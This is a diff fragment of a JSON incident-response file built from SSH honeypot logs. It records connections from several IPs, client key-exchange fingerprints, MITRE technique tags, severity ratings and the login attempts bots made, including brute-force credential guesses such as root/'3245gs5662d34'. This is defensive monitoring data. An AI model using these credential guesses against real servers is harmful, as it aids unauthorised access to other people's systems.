+            ""
+          ],
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T08:37:03.951484Z",
+          "src_ip": "103.72.147.99",
+          "protocol": "ssh",
+          "event": "cowrie.client.kex"
+        },
+        {
+          "eventid": "cowrie.login.failed",
+          "username": "345gs5662d34",
+          "password": "345gs5662d34",
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T08:37:04.357419Z",
+          "src_ip": "103.72.147.99",
+          "protocol": "ssh",
+          "event": "cowrie.login.failed"
+        },
+        {
+          "eventid": "cowrie.session.closed",
+          "duration": "1.6",
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T08:37:05.451094Z",
+          "src_ip": "103.72.147.99",
+          "protocol": "ssh",
+          "event": "cowrie.session.closed"
+        }
+      ]
+    },
+    {
+      "case_id": "IR-9b253a006be2",
+      "src_ip": "103.72.147.99",
+      "first_seen": "2026-04-02T08:37:05.552332Z",
+      "last_seen": "2026-04-02T08:37:06.161073Z",
+      "duration_seconds": 0,
+      "login_attempts": 1,
+      "login_success": true,
+      "commands": [],
+      "downloads": [],
+      "ttps": [
+        "T1078",
+        "T1592"
+      ],
+      "severity": "HIGH",
+      "timeline": [
+        {
+          "eventid": "cowrie.session.connect",
+          "src_ip": "103.72.147.99",
+          "src_port": 38884,
+          "dst_ip": "172.31.34.72",
+          "dst_port": 2222,
+          "protocol": "ssh",
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T08:37:05.552332Z",
+          "event": "cowrie.session.connect"
+        },
+        {
+          "eventid": "cowrie.client.version",
+          "version": "SSH-2.0-libssh_0.11.1",
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T08:37:05.552990Z",
+          "src_ip": "103.72.147.99",
+          "protocol": "ssh",
+          "event": "cowrie.client.version"
+        },
+        {
+          "eventid": "cowrie.client.kex",
+          "hassh": "03a80b21afa810682a776a7d42e5e6fb",
+          "hasshAlgorithms": "curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,ext-info-c,kex-strict-c-v00@openssh.com;chacha20-poly1305@openssh.com,aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha2-256,hmac-sha2-512;none,zlib@openssh.com",
+          "kexAlgs": [
+            "curve25519-sha256",
+            "curve25519-sha256@libssh.org",
+            "ecdh-sha2-nistp256",
+            "ecdh-sha2-nistp384",
+            "ecdh-sha2-nistp521",
+            "diffie-hellman-group18-sha512",
+            "diffie-hellman-group16-sha512",
+            "diffie-hellman-group-exchange-sha256",
+            "diffie-hellman-group14-sha256",
+            "ext-info-c",
+            "kex-strict-c-v00@openssh.com"
+          ],
+          "keyAlgs": [
+            "ssh-ed25519",
+            "ecdsa-sha2-nistp521",
+            "ecdsa-sha2-nistp384",
+            "ecdsa-sha2-nistp256",
+            "sk-ssh-ed25519@openssh.com",
+            "sk-ecdsa-sha2-nistp256@openssh.com",
+            "rsa-sha2-512",
+            "rsa-sha2-256"
+          ],
+          "encCS": [
+            "chacha20-poly1305@openssh.com",
+            "aes256-gcm@openssh.com",
+            "aes128-gcm@openssh.com",
+            "aes256-ctr",
+            "aes192-ctr",
+            "aes128-ctr"
+          ],
+          "macCS": [
+            "hmac-sha2-256-etm@openssh.com",
+            "hmac-sha2-512-etm@openssh.com",
+            "hmac-sha2-256",
+            "hmac-sha2-512"
+          ],
+          "compCS": [
+            "none",
+            "zlib@openssh.com"
+          ],
+          "langCS": [
+            ""
+          ],
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T08:37:05.647014Z",
+          "src_ip": "103.72.147.99",
+          "protocol": "ssh",
+          "event": "cowrie.client.kex"
+        },
+        {
+          "eventid": "cowrie.login.success",
+          "username": "root",
+          "password": "3245gs5662d34",
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T08:37:06.065099Z",
+          "src_ip": "103.72.147.99",
+          "protocol": "ssh",
+          "event": "cowrie.login.success"
+        },
+        {
+          "eventid": "cowrie.session.closed",
+          "duration": "0.6",
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T08:37:06.161073Z",
+          "src_ip": "103.72.147.99",
+          "protocol": "ssh",
+          "event": "cowrie.session.closed"
+        }
+      ]
+    },
+    {
+      "case_id": "IR-6adb25926404",
+      "src_ip": "123.212.9.122",
+      "first_seen": "2026-04-02T08:39:26.091683Z",
+      "last_seen": "2026-04-02T08:39:30.722120Z",
+      "duration_seconds": 4,
+      "login_attempts": 1,
+      "login_success": false,
+      "commands": [],
+      "downloads": [],
+      "ttps": [
+        "T1110.001",
+        "T1592"
+      ],
+      "severity": "LOW",
+      "timeline": [
+        {
+          "eventid": "cowrie.session.connect",
+          "src_ip": "123.212.9.122",
+          "src_port": 38769,
+          "dst_ip": "172.31.34.72",
+          "dst_port": 2222,
+          "protocol": "ssh",
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T08:39:26.091683Z",
+          "event": "cowrie.session.connect"
+        },
+        {
+          "eventid": "cowrie.client.version",
+          "version": "SSH-2.0-OpenSSH_7.4",
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T08:39:26.886878Z",
+          "src_ip": "123.212.9.122",
+          "protocol": "ssh",
+          "event": "cowrie.client.version"
+        },
+        {
+          "eventid": "cowrie.client.kex",
+          "hassh": "acaa53e0a7d7ac7d1255103f37901306",
+          "hasshAlgorithms": "diffie-hellman-group1-sha1,diffie-hellman-group14-sha1,diffie-hellman-group14-sha256,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group-exchange-sha1,diffie-hellman-group-exchange-sha256,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,curve25519-sha256,curve25519-sha256@libssh.org,ext-info-c;des,3des,blowfish,none,3des-cbc,blowfish-cbc,cast128-cbc,arcfour,arcfour128,arcfour256,aes128-cbc,aes192-cbc,aes256-cbc,rijndael-cbc@lysator.liu.se,aes128-ctr,aes192-ctr,aes256-ctr,aes128-gcm@openssh.com,aes256-gcm@openssh.com,chacha20-poly1305@openssh.com;hmac-sha1,hmac-sha1-96,hmac-sha2-256,hmac-sha2-512,hmac-md5,hmac-md5-96,hmac-ripemd160,hmac-ripemd160@openssh.com,umac-64@openssh.com,umac-128@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha1-96-etm@openssh.com,hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-md5-etm@openssh.com,hmac-md5-96-etm@openssh.com,hmac-ripemd160-etm@openssh.com,umac-64-etm@openssh.com,umac-128-etm@openssh.com;none,zlib@openssh.com,zlib",
+          "kexAlgs": [
+            "diffie-hellman-group1-sha1",
+            "diffie-hellman-group14-sha1",
+            "diffie-hellman-group14-sha256",
+            "diffie-hellman-group16-sha512",
+            "diffie-hellman-group18-sha512",
+            "diffie-hellman-group-exchange-sha1",
+            "diffie-hellman-group-exchange-sha256",
+            "ecdh-sha2-nistp256",
+            "ecdh-sha2-nistp384",
+            "ecdh-sha2-nistp521",
+            "curve25519-sha256",
+            "curve25519-sha256@libssh.org",
+            "ext-info-c"
+          ],
+          "keyAlgs": [
+            "ssh-ed25519",
+            "ssh-ed25519-cert-v01@openssh.com",
+            "ecdsa-sha2-nistp256",
+            "ecdsa-sha2-nistp256-cert-v01@openssh.com",
+            "ecdsa-sha2-nistp384",
+            "ecdsa-sha2-nistp384-cert-v01@openssh.com",
+            "ecdsa-sha2-nistp521",
+            "ecdsa-sha2-nistp521-cert-v01@openssh.com",
+            "ssh-rsa",
+            "ssh-rsa-cert-v01@openssh.com",
+            "ssh-dss",
+            "ssh-dss-cert-v01@openssh.com"
+          ],
+          "encCS": [
+            "des",
+            "3des",
+            "blowfish",
+            "none",
+            "3des-cbc",
+            "blowfish-cbc",
+            "cast128-cbc",
+            "arcfour",
+            "arcfour128",
+            "arcfour256",
+            "aes128-cbc",
+            "aes192-cbc",
+            "aes256-cbc",
+            "rijndael-cbc@lysator.liu.se",
+            "aes128-ctr",
+            "aes192-ctr",
+            "aes256-ctr",
+            "aes128-gcm@openssh.com",
+            "aes256-gcm@openssh.com",
+            "chacha20-poly1305@openssh.com"
+          ],
+          "macCS": [
+            "hmac-sha1",
+            "hmac-sha1-96",
+            "hmac-sha2-256",
+            "hmac-sha2-512",
+            "hmac-md5",
+            "hmac-md5-96",
+            "hmac-ripemd160",
+            "hmac-ripemd160@openssh.com",
+            "umac-64@openssh.com",
+            "umac-128@openssh.com",
+            "hmac-sha1-etm@openssh.com",
+            "hmac-sha1-96-etm@openssh.com",
+            "hmac-sha2-256-etm@openssh.com",
+            "hmac-sha2-512-etm@openssh.com",
+            "hmac-md5-etm@openssh.com",
+            "hmac-md5-96-etm@openssh.com",
+            "hmac-ripemd160-etm@openssh.com",
+            "umac-64-etm@openssh.com",
+            "umac-128-etm@openssh.com"
+          ],
+          "compCS": [
+            "none",
+            "zlib@openssh.com",
+            "zlib"
+          ],
+          "langCS": [
+            ""
+          ],
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T08:39:26.887542Z",
+          "src_ip": "123.212.9.122",
+          "protocol": "ssh",
+          "event": "cowrie.client.kex"
+        },
+        {
+          "eventid": "cowrie.login.failed",
+          "username": "test",
+          "password": "222222",
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T08:39:28.867067Z",
+          "src_ip": "123.212.9.122",
+          "protocol": "ssh",
+          "event": "cowrie.login.failed"
+        },
+        {
+          "eventid": "cowrie.session.closed",
+          "duration": "4.6",
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T08:39:30.722120Z",
+          "src_ip": "123.212.9.122",
+          "protocol": "ssh",
+          "event": "cowrie.session.closed"
+        }
+      ]
+    },
+    {
+      "case_id": "IR-fb6b25b0c15b",
+      "src_ip": "52.225.25.99",
+      "first_seen": "2026-04-02T08:53:34.760652Z",
+      "last_seen": "2026-04-02T08:53:34.761538Z",
       "duration_seconds": 0,
       "login_attempts": 0,
       "login_success": false,
@@ -1916,21 +2839,21 @@
       "timeline": [
         {
           "eventid": "cowrie.session.connect",
-          "src_ip": "4.236.173.162",
-          "src_port": 33808,
+          "src_ip": "52.225.25.99",
+          "src_port": 26560,
           "dst_ip": "172.31.34.72",
           "dst_port": 2222,
           "protocol": "ssh",
           "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
-          "timestamp": "2026-04-02T07:08:36.312052Z",
+          "timestamp": "2026-04-02T08:53:34.760652Z",
           "event": "cowrie.session.connect"
         },
         {
           "eventid": "cowrie.session.closed",
           "duration": "0.0",
           "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
-          "timestamp": "2026-04-02T07:08:36.312928Z",
-          "src_ip": "4.236.173.162",
+          "timestamp": "2026-04-02T08:53:34.761538Z",
+          "src_ip": "52.225.25.99",
           "protocol": "ssh",
           "event": "cowrie.session.closed"
         }
